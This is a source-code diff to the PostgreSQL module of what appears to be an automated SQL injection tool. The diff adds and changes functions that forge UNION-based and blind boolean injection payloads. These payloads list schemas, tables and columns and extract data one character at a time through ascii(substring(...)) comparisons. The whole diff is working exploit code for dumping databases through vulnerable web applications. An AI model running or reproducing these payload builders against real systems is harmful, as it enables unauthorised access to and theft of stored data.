@@ -35,27 +35,27 @@ class PostgresMole(DbmsMole):
         
     def _schemas_query_info(self):
         return {
-            'table' : 'pg_catalog.pg_database',
-            'field' : 'datname'
+            'table' : 'pg_tables',
+            'field' : 'distinct(schemaname)'
         }
     
     def _tables_query_info(self, db):
         return {
-            'table' : 'information_schema.tables',
-            'field' : 'table_name',
-            'filter': "table_schema = '{db}'".format(db=self._db_name(db))
+            'table' : 'pg_tables',
+            'field' : 'tablename',
+            'filter': "schemaname = '{db}'".format(db=db)
         }
     
     def _columns_query_info(self, db, table):
         return {
-            'table' : 'information_schema.columns',
-            'field' : 'column_name',
-            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=self._db_name(db), table=table)
+            'table' : 'pg_namespace,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid',
+            'field' : 'attname',
+            'filter': "a.relnamespace=pg_namespace.oid AND attnum>0 AND nspname='{db}' AND a.relname='{table}'".format(db=db, table=table)
         }
         
     def _fields_query_info(self, fields, db, table, where):
         return {
-            'table' : table,
+            'table' : db + '.' + table,
             'field' : ','.join(fields),
             'filter': where
         }
@@ -63,8 +63,27 @@ class PostgresMole(DbmsMole):
     def _dbinfo_query_info(self):
         return {
             'field' : 'getpgusername(),version(),current_database()', 
-            'table' : 'information_schema.schemata'
+            'table' : ''
         }
+        
+    def forge_blind_query(self, index, value, field, table, where="1=1", offset=0):
+        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
+            return ' and {op_par}' + str(value) + ' < (select distinct on(schemaname) ascii(substring(schemaname, '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
+        else:
+            return DbmsMole.forge_blind_query(self, index, value, field, table, where, offset)
+        
+        
+    def forge_blind_count_query(self, operator, value, table, where="1=1"):
+        if table == 'pg_tables' and where == "1=1":
+            return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(distinct(schemaname)) from '+table+' where '+self.parse_condition(where)+')'
+        else:
+            return DbmsMole.forge_blind_count_query(self, operator, value, table, where)
+
+    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
+        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
+            return ' and {op_par}' + str(value) + ' ' + operator + ' (select distinct on(schemaname) length(schemaname) from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
+        else:
+            return DbmsMole.forge_blind_len_query(self, operator, value, field, table, where, offset)
 
     @classmethod
     def dbms_name(cls):
@@ -78,16 +97,26 @@ class PostgresMole(DbmsMole):
     def dbms_check_blind_query(cls):
         return ' and {op_par}0 < (select length(getpgusername()))'
     
-    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, column_count, fields, table_name, injectable_field, where = None, offset = 0):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
+        # It's not beatiful but it works :D
+        if fields == 'distinct(schemaname)':
+            query += " distinct on(schemaname) "
+            fields = 'schemaname'
         query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
                                             ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
                                             ")||" + PostgresMole.out_delimiter + ")"
                                         )
+    
         query += ','.join(query_list)
-        query += " from " + table_name + " where " + self.parse_condition(where) + \
-                 " limit 1 offset " + str(offset)
+        at_end = ''
+        if len(table_name) > 0:
+            query += " from " + table_name 
+            at_end = " limit 1 offset " + str(offset)
+        if not where is None:
+            query += " where " + self.parse_condition(where)
+        query += at_end
         return query
         
     @classmethod
